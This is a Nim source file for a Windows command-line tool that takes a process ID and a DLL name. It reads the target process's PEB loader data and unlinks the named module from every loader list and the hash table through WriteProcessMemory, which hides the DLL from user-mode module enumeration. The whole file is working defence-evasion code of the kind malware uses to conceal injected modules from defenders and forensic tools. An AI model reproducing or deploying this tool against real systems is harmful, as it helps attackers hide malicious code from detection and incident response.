import winim
import std/os
import std/strutils
import Structs

proc PrintHelp():void =
    echo "[!] Usage: ",getAppFilename()," <PID> <DLL Name>"

proc DeleteNodeFromDoubleLinkedList(processHandle: HANDLE, dllEntry: Structs.PLDR_DATA_TABLE_ENTRY):void = 
    var backEntry:uint64 = cast[uint64](dllEntry.InLoadOrderModuleList.Blink)
    var forwardEntry:uint64 = cast[uint64](dllEntry.InLoadOrderModuleList.Flink)
    # entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](backEntry),addr forwardEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    # entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](forwardEntry + 8),addr backEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    backEntry = cast[uint64](dllEntry.InMemoryOrderModuleList.Blink)
    forwardEntry = cast[uint64](dllEntry.InMemoryOrderModuleList.Flink)
    # entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](backEntry),addr forwardEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    # entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](forwardEntry + 8),addr backEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    backEntry = cast[uint64](dllEntry.InInitializationOrderModuleList.Blink)
    forwardEntry = cast[uint64](dllEntry.InInitializationOrderModuleList.Flink)
    # entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](backEntry),addr forwardEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    # entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](forwardEntry + 8),addr backEntry,8,NULL)):
        echo "[!] Error on writing pointers! Error: ",GetLastError()
        quit(0)
    backEntry = cast[uint64](dllEntry.HashLinks.Blink)
    forwardEntry = cast[uint64](dllEntry.HashLinks.Flink)
    # pLdrModule->HashTableEntry.Blink->Flink = pLdrModule->HashTableEntry.Flink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](backEntry),addr forwardEntry,8,NULL)):
        echo GetLastError()
        echo "[!] Error on writing pointers!"
        quit(0)
    # pLdrModule->HashTableEntry.Flink->Blink = pLdrModule->HashTableEntry.Blink;
    if(FALSE == WriteProcessMemory(processHandle,cast[LPVOID](forwardEntry + 8),addr backEntry,8,NULL)):
        echo GetLastError()
        echo "[!] Error on writing pointers!"
        quit(0)

proc HideDLLFromUserSpace(): void = 
    if(paramCount() != 2):
        PrintHelp()
        quit(0)
    var pNtQueryInformationProcess:NtQueryInformationProcessType = cast[NtQueryInformationProcessType](GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess"))
    var processBasicInfo:PROCESS_BASIC_INFORMATION
    var processId:DWORD = cast[DWORD](parseInt(commandLineParams()[0]))
    var dllFileName:wstring = +$(commandLineParams()[1])
    var processHandle:HANDLE = OpenProcess(cast[DWORD](PROCESS_ALL_ACCESS),false, processId)
    var status:NTSTATUS =  pNtQueryInformationProcess(processHandle, 0, cast[PVOID](addr processBasicInfo), cast[ULONG](sizeof(PROCESS_BASIC_INFORMATION)), cast[PULONG](0));
    if(not NT_SUCCESS(status)):
        echo "[!] Error on getting Process information! Error: ",GetLastError()
        quit(0)
    var pebStruct: Structs.PEB
    if(FALSE == ReadProcessMemory(processHandle,cast[LPCVOID](processBasicInfo.PebBaseAddress), addr pebStruct, sizeof(Structs.PEB),NULL)):
        echo "[!] Error on reading Remote PEB! Error: ",GetLastError()
        quit(0)

    var loaderData:Structs.PEB_LDR_DATA
    if(FALSE ==  ReadProcessMemory(processHandle,pebStruct.Ldr, addr loaderData, sizeof(Structs.PEB_LDR_DATA),NULL)):
        echo "[!] Error on reading Loader Data! Error: ",GetLastError()
        quit(0)
    var tempDLLEntry: Structs.LDR_DATA_TABLE_ENTRY
    var selectedDLLEntry: Structs.LDR_DATA_TABLE_ENTRY
    var cursorForListEntries: PLIST_ENTRY = loaderData.InLoadOrderModuleList.Flink
    var headForListEntries: PLIST_ENTRY =  cast[PLISTENTRY](cast[uint64](pebStruct.Ldr) + cast[uint64](sizeof(ULONG)) + cast[uint64](4) + cast[uint64](sizeof(PVOID)))
    var tempArrayForUnicode:array[32, uint16]
    var dllFound: bool = false
    echo "[+] List of currently loaded modules: "
    while true:
        if(FALSE ==  ReadProcessMemory(processHandle,cursorForListEntries, addr tempDLLEntry, sizeof(Structs.LDR_DATA_TABLE_ENTRY),NULL)):
            echo "[!] Error on reading Loader Data! Error: ",GetLastError()
            quit(0)
        if(FALSE ==  ReadProcessMemory(processHandle,tempDLLEntry.BaseDllName.Buffer, addr tempArrayForUnicode[0], 32*sizeof(uint16),NULL)):
            echo "[!] Error on reading Dll Name! Error: ",GetLastError()
            quit(0)
        var dllNameAsString: wstring = newWString(0)
        var index: int = 0
        while tempArrayForUnicode[index] != 0x0:
            dllNameAsString.add(cast[WCHAR](tempArrayForUnicode[index]))
            index=index+1 
        echo "  [-] ",dllNameAsString
        # Case sensitive!
        if(dllNameAsString == dllFileName):
            dllFound = true
            copyMem(addr selectedDLLEntry, addr tempDLLEntry,sizeof(Structs.LDR_DATA_TABLE_Entry))
            # quit(0)
        cursorForListEntries = tempDLLEntry.InLoadOrderModuleList.Flink
        if(cursorForListEntries == headForListEntries):
            break
    if(dllFound):
        DeleteNodeFromDoubleLinkedList(processHandle,addr selectedDLLEntry)
        echo "[+] Specified Dll is successfully unlinked from PEB!"
    else:
        echo "[!] Specified Dll not found!"


when isMainModule:
    SetLastError(0)
    HideDLLFromUserSpace()